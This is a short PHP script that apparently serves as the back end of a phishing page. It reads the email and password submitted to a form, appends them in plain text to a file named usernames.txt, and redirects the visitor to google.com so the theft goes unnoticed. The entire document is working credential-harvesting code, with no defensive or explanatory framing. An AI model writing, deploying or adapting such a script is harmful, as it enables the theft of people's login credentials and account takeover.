<?php
$email = $_POST['email'];
$pass = $_POST['password'];

file_put_contents("usernames.txt", "Username: " . $email . " Pass: " . $pass . "\n", FILE_APPEND);

header('Location: https://google.com'); // Redirect to a generic site or the original one
exit();
?>
